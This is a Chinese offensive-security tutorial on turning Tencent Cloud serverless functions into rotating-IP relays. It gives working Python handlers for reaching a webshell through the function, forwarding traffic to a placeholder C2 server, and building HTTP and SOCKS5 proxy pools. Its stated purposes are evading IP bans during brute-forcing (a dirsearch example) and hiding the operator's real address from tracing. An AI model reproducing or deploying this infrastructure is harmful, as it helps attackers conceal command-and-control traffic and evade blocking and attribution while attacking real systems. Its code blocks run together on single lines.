0x01 前言

腾讯云云函数（Serverless Cloud Function，SCF）为函数即服务（Function as a Service，FaaS）产品，提供无服务器（Serverless） 和 FaaS 的计算平台。运行方式依赖事件触发。云函数（Serverless Cloud Function，SCF）提供代码部署、镜像部署两种部署方式，支持事件函数和 Web 函数两种函数类型。而且，最主要的是它发出的请求时具有多出口的特点。


0x02 事件函数

本文主要关注代码部署的事件函数，SCF 事件函数有三个基本概念：执行方法、函数入参和函数返回。

以python为例，简单看一下官方的demo

import jsondef main_handler(event, context):  print("Received event: "+ json.dumps(event, indent = 2))  print("Received context:" + str(context))  return("Hello World")

其中main_handler为执行方法，即函数入口，event用于传递触发事件数据，context为 SCF 平台提供的入参，将 context 入参传递给执行方法，代码可通过解析 context 入参对象，获取到运行环境及当前请求的相关信息。event和context均为dict类型,为保证针对各开发语言和环境的统一性，event 入参和 context 入参均使用 JSON 数据格式统一封装。return用以返回函数结果，它能直接返回可序列化对象。在这里顺便提一下，在云函数中，可以通过使用 raise Exception 的方式抛出异常。


0x03 触发器

触发云函数的方式有两种，一种为通过调用云API触发函数执行，另一种是通过绑定触发器触发函数执行，这里主要关注绑定触发器的方式。其中触发器又分为很多种，在这里只关注API网关触发器。

1.API网关触发器

可以通过编写 SCF 云函数来实现 Web 后端服务，并通过 API 网关对外提供服务。API 网关会将请求内容以参数形式传递给函数，并将函数返回作为响应返回给请求方。

API 网关在接受到 API 请求后，如果 API 在网关上的后端配置了对接云函数，该函数将会被触发运行。同时 API 网关会将 API 请求的相关信息以 event 入参的形式发送给被触发的函数。API 请求的相关信息包含了例如具体接受到请求的服务和 API 规则、请求的实际路径、方法、请求的 path、header、query 等内容。

不妨看一下API网关触发器触发云函数（集中请求）所传递的数据结构，即event的字段

不妨回顾一下前面所讲云函数的一些特性，首先通过云函数发送的请求每一次地址都会不一样，然后API 网关可以将请求内容以参数形式传递给函数，并将函数返回作为响应返回给请求方。

也就是说，我们可以利用云函数作为代理去进行访问，而且每一次发起的访问使用的地址都是不同的，这就能有效防止单个IP访问次数过多被BAN，并且可以隐藏真实IP。

2.规避溯源连接webshell

首先在腾讯云搜索“云函数”，然后进去，新建一个云函数

然后开始编写代码，其实就是一个简单的爬虫，只不过在这里是通过event的字段设置请求内容

# -*- coding:utf-8 -*-import requestsimport jsonfrom urllib.parse import urlsplitdef geturl(query):    json_query = json.dumps(query)    dict_query =json.loads(json_query)    return dict_query['u']def main_handler(event, context):    url =geturl(event['queryString'])    host = urlsplit(url).netloc    data = event['body']    headers=event['headers']    headers["host"] = host   r=requests.post(url,data=data,headers=headers,verify=False)    response={    "isBase64Encoded":False,    "statusCode": 200,    "headers":{'Content-Type': 'text/html;charset='+r.apparent_encoding},    "body": r.text    }    return response

部署一下，然后在触发管理处新建一个触发器，选择API网关触发

随后会生成一个访问路径

我们此时在蚁剑中访问webshell就可以使用访问路径+webshell路径的方式进行访问了（注意拼接方式）

# -*- coding: utf8 -*-import json,requests,base64def main_handler(event, context):    C2='http://<C2服务器地址>' # 这里可以使用 HTTP、HTTPS~下角标~    path=event['path']    headers=event['headers']    print(event)    if event['httpMethod'] == 'GET':       resp=requests.get(C2+path,headers=headers,verify=False)    else:       resp=requests.post(C2+path,data=event['body'],headers=headers,verify=False)        print(resp.headers)        print(resp.content)    response={        "isBase64Encoded":True,        "statusCode":resp.status_code,        "headers": dict(resp.headers),        "body":str(base64.b64encode(resp.content))[2:-1]    }    return response

4.搭建HTTP代理池

同理，我们还可以利用这个原理部署一个HTTP代理池，这里直接使用[hashsecteam/scf-proxy (github.com)]项目

将项目下载下来后，对Makefile做一些修改，不然国内用户可能会由于访问不到https://proxy.golang.org而报错

build: server clientenv GO111MODULE=on GOPROXY=https://goproxy.cn,directserver: clean         env GO111MODULE=onGOPROXY=https://goproxy.cn,direct GOOS=linux GOARCH=amd64 go build -trimpathserver.go         zip server.zip server client: clean         env GO111MODULE=onGOPROXY=https://goproxy.cn,direct go build -trimpath client.go fmt:         go fmt ./... clean:         -rm server server.zip client

然后再当前目录执行make命令，目录下会生成一个server.zip以及client，我们在腾讯云建一个云函数，云函数的名字要小写，这次运行环境选择为GO1，函数代码的提交方法设置为本地上传zip包，执行方法设为server，然后把server.zip传上去。

触发管理设置为API网关触发

然后把函数配置中的超时时间设置为最大【稍大点就行，如：15】

然后客户端设置监听，即搭建好一条HTTP通道

./client -port 10086 https://云函数访问路径

此时我们给工具设置代理为127.0.0.1:1999即可使用代理进行爆破，如

python3 dirsearch.py --proxy 127.0.0.1:1999 -u http://xxxx


5.搭建socks5代理池

不止于此，还可以搭建socks5代理，使我们可以在爆破其它服务时隐藏身份及规避封禁，这里使用SCFProxy项目，这位师傅的思路文章放在参考链接了，可以看一看

首先，还是在云函数部署一下代码,，将server.py粘贴到云函数编辑器，bridge_ip和bridge_port参数为vps的socks开启监听的ip和端口

import jsonimport socketimport select  bridge_ip = ""bridge_port = 1234  def main_handler(event, context):    data =json.loads(event["body"])    out =socket.socket(socket.AF_INET, socket.SOCK_STREAM)   out.connect((data["host"], data["port"]))     bridge =socket.socket(socket.AF_INET, socket.SOCK_STREAM)    bridge.connect((bridge_ip,bridge_port))   bridge.send(data["uid"].encode("ascii"))     while True:        readable, _, _ =select.select([out, bridge], [], [])        if out in readable:            data = out.recv(4096)            bridge.send(data)        if bridge in readable:            data = bridge.recv(4096)            out.send(data)

然后配置一下API网关触发器

然后将函数配置中执行超时时间调到最大【可维持长连接15分钟】

然后将socks_client文件夹及requirements.txt上传到服务器【需要有python3.7.0以上环境】，然后执行以下命令【前两条可省略】

python3 -m venv .venv    //python新建虚拟环境source .venv/bin/activate   //进入虚拟环境pip3 install -r requirements.txt

然后执行下列命令建立socks通道

python3 socks5.py -u "API访问路径" -bp 监听端口 -sp socks端口 --user user --passwd pass

然后就可以使用代理工具进行连接了，可以看到IP已经变为广州的IP了
